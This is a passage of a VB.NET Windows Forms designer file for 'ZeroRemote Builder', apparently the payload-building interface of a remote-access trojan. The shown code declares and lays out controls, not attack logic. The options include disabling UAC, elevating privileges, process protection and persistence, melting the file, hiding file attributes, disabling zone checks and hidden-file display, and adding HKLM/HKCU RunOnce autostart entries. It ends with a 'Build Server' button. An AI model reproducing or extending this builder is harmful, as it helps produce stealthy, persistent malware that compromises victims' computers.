        Me.CheckBoxMelt.UseVisualStyleBackColor = True
        '
        'CheckBoxHiddenAttributes
        '
        Me.CheckBoxHiddenAttributes.AutoSize = True
        Me.CheckBoxHiddenAttributes.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxHiddenAttributes.Location = New System.Drawing.Point(24, 32)
        Me.CheckBoxHiddenAttributes.Name = "CheckBoxHiddenAttributes"
        Me.CheckBoxHiddenAttributes.Size = New System.Drawing.Size(124, 17)
        Me.CheckBoxHiddenAttributes.TabIndex = 0
        Me.CheckBoxHiddenAttributes.Text = "Hidden Attributes"
        Me.CheckBoxHiddenAttributes.UseVisualStyleBackColor = True
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.ButtonMutex)
        Me.GroupBox8.Controls.Add(Me.TextBoxMutex)
        Me.GroupBox8.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox8.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBox8.Location = New System.Drawing.Point(373, 307)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(244, 55)
        Me.GroupBox8.TabIndex = 5
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "Mutex"
        '
        'ButtonMutex
        '
        Me.ButtonMutex.Image = CType(resources.GetObject("ButtonMutex.Image"), System.Drawing.Image)
        Me.ButtonMutex.Location = New System.Drawing.Point(209, 19)
        Me.ButtonMutex.Name = "ButtonMutex"
        Me.ButtonMutex.Size = New System.Drawing.Size(22, 22)
        Me.ButtonMutex.TabIndex = 1
        Me.ButtonMutex.UseVisualStyleBackColor = True
        '
        'TextBoxMutex
        '
        Me.TextBoxMutex.Location = New System.Drawing.Point(23, 20)
        Me.TextBoxMutex.Name = "TextBoxMutex"
        Me.TextBoxMutex.ReadOnly = True
        Me.TextBoxMutex.Size = New System.Drawing.Size(179, 21)
        Me.TextBoxMutex.TabIndex = 0
        '
        'GroupBoxIcon
        '
        Me.GroupBoxIcon.Controls.Add(Me.PictureBoxIcon)
        Me.GroupBoxIcon.Controls.Add(Me.ButtonSelectIcon)
        Me.GroupBoxIcon.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBoxIcon.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBoxIcon.Location = New System.Drawing.Point(623, 307)
        Me.GroupBoxIcon.Name = "GroupBoxIcon"
        Me.GroupBoxIcon.Size = New System.Drawing.Size(104, 55)
        Me.GroupBoxIcon.TabIndex = 6
        Me.GroupBoxIcon.TabStop = False
        Me.GroupBoxIcon.Text = "Icon"
        '
        'PictureBoxIcon
        '
        Me.PictureBoxIcon.Image = CType(resources.GetObject("PictureBoxIcon.Image"), System.Drawing.Image)
        Me.PictureBoxIcon.Location = New System.Drawing.Point(11, 18)
        Me.PictureBoxIcon.Name = "PictureBoxIcon"
        Me.PictureBoxIcon.Size = New System.Drawing.Size(38, 28)
        Me.PictureBoxIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.PictureBoxIcon.TabIndex = 1
        Me.PictureBoxIcon.TabStop = False
        '
        'ButtonSelectIcon
        '
        Me.ButtonSelectIcon.Location = New System.Drawing.Point(62, 21)
        Me.ButtonSelectIcon.Name = "ButtonSelectIcon"
        Me.ButtonSelectIcon.Size = New System.Drawing.Size(30, 23)
        Me.ButtonSelectIcon.TabIndex = 0
        Me.ButtonSelectIcon.Text = "..."
        Me.ButtonSelectIcon.UseVisualStyleBackColor = True
        '
        'CheckBoxTOS
        '
        Me.CheckBoxTOS.AutoSize = True
        Me.CheckBoxTOS.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBoxTOS.Location = New System.Drawing.Point(406, 380)
        Me.CheckBoxTOS.Name = "CheckBoxTOS"
        Me.CheckBoxTOS.Size = New System.Drawing.Size(198, 17)
        Me.CheckBoxTOS.TabIndex = 9
        Me.CheckBoxTOS.Text = "By compiling you agree to the"
        Me.CheckBoxTOS.UseVisualStyleBackColor = True
        '
        'LinkLabelTOS
        '
        Me.LinkLabelTOS.AutoSize = True
        Me.LinkLabelTOS.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LinkLabelTOS.Location = New System.Drawing.Point(600, 381)
        Me.LinkLabelTOS.Name = "LinkLabelTOS"
        Me.LinkLabelTOS.Size = New System.Drawing.Size(31, 13)
        Me.LinkLabelTOS.TabIndex = 2
        Me.LinkLabelTOS.TabStop = True
        Me.LinkLabelTOS.Text = "TOS"
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.PictureBox2)
        Me.GroupBox3.Controls.Add(Me.CheckBoxElevate)
        Me.GroupBox3.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox3.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBox3.Location = New System.Drawing.Point(12, 80)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(355, 46)
        Me.GroupBox3.TabIndex = 10
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Permissions"
        '
        'PictureBox2
        '
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(248, 21)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox2.TabIndex = 7
        Me.PictureBox2.TabStop = False
        '
        'PictureBox6
        '
        Me.PictureBox6.Image = CType(resources.GetObject("PictureBox6.Image"), System.Drawing.Image)
        Me.PictureBox6.Location = New System.Drawing.Point(384, 379)
        Me.PictureBox6.Name = "PictureBox6"
        Me.PictureBox6.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox6.TabIndex = 8
        Me.PictureBox6.TabStop = False
        '
        'ButtonBuild
        '
        Me.ButtonBuild.Image = CType(resources.GetObject("ButtonBuild.Image"), System.Drawing.Image)
        Me.ButtonBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.ButtonBuild.Location = New System.Drawing.Point(638, 378)
        Me.ButtonBuild.Name = "ButtonBuild"
        Me.ButtonBuild.Size = New System.Drawing.Size(92, 23)
        Me.ButtonBuild.TabIndex = 7
        Me.ButtonBuild.Text = "Build Server"
        Me.ButtonBuild.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.ButtonBuild.UseVisualStyleBackColor = True
        '
        'Builder
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(741, 441)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.LinkLabelTOS)
        Me.Controls.Add(Me.CheckBoxTOS)
        Me.Controls.Add(Me.PictureBox6)
        Me.Controls.Add(Me.ButtonBuild)
        Me.Controls.Add(Me.GroupBoxIcon)
        Me.Controls.Add(Me.GroupBox8)
        Me.Controls.Add(Me.GroupBox6)
        Me.Controls.Add(Me.GroupBoxSecurityandProtection)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.MinimumSize = New System.Drawing.Size(519, 295)
        Me.Name = "Builder"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent
        Me.Text = " ZeroRemote Builder"
        Me.TopMost = True
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox7.PerformLayout()
        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).EndInit()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.GroupBoxSecurityandProtection.ResumeLayout(False)
        Me.GroupBoxSecurityandProtection.PerformLayout()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        Me.GroupBoxIcon.ResumeLayout(False)
        CType(Me.PictureBoxIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox6, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents ImageListBuilder As System.Windows.Forms.ImageList
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TextBoxURL As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents RadioButtonWinDir As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButtonTemp As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButtonAppData As System.Windows.Forms.RadioButton
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckBoxEnableInstallation As System.Windows.Forms.CheckBox
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabelOptionInformation As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolTipInfo As System.Windows.Forms.ToolTip
    Friend WithEvents GroupBoxSecurityandProtection As System.Windows.Forms.GroupBox
    Friend WithEvents CheckBoxProcessProtection As System.Windows.Forms.CheckBox
    Friend WithEvents PictureBox3 As System.Windows.Forms.PictureBox
    Friend WithEvents CheckBoxBreakOnTermination As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBoxDisableZoneChecks As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBoxProcessPersistance As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckBoxHiddenAttributes As System.Windows.Forms.CheckBox
    Friend WithEvents PictureBox4 As System.Windows.Forms.PictureBox
    Friend WithEvents CheckBoxDisableUAC As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents ComboBoxRunOnce As System.Windows.Forms.ComboBox
    Friend WithEvents LabelRunOnce As System.Windows.Forms.Label
    Friend WithEvents TextBoxInstallFolderName As System.Windows.Forms.TextBox
    Friend WithEvents LabelInstallFolderName As System.Windows.Forms.Label
    Friend WithEvents TextBoxInstallFileName As System.Windows.Forms.TextBox
    Friend WithEvents LabelInstallFileName As System.Windows.Forms.Label
    Friend WithEvents TextBoxHKLM As System.Windows.Forms.TextBox
    Friend WithEvents TextBoxHKCU As System.Windows.Forms.TextBox
    Friend WithEvents PictureBox5 As System.Windows.Forms.PictureBox
    Friend WithEvents CheckBoxHKLM As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBoxHKCU As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBoxMelt As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBoxDisableShowHiddenFiles As System.Windows.Forms.CheckBox
    Friend WithEvents ButtonAdvanced As System.Windows.Forms.Button
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents ButtonMutex As System.Windows.Forms.Button
    Friend WithEvents TextBoxMutex As System.Windows.Forms.TextBox
    Friend WithEvents CheckBoxVisibleMode As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBoxIcon As System.Windows.Forms.GroupBox
    Friend WithEvents PictureBoxIcon As System.Windows.Forms.PictureBox
    Friend WithEvents ButtonSelectIcon As System.Windows.Forms.Button
    Friend WithEvents ButtonAssemblyInfo As System.Windows.Forms.Button
    Friend WithEvents ButtonBuild As System.Windows.Forms.Button
    Friend WithEvents PictureBox6 As System.Windows.Forms.PictureBox
    Friend WithEvents CheckBoxTOS As System.Windows.Forms.CheckBox
    Friend WithEvents LinkLabelTOS As System.Windows.Forms.LinkLabel
    Friend WithEvents CheckBoxElevate As System.Windows.Forms.CheckBox
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
    Friend WithEvents ToolStripSplitButton1 As System.Windows.Forms.ToolStripSplitButton
    Friend WithEvents ButtonConnectionSpeed As System.Windows.Forms.Button
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
End Class
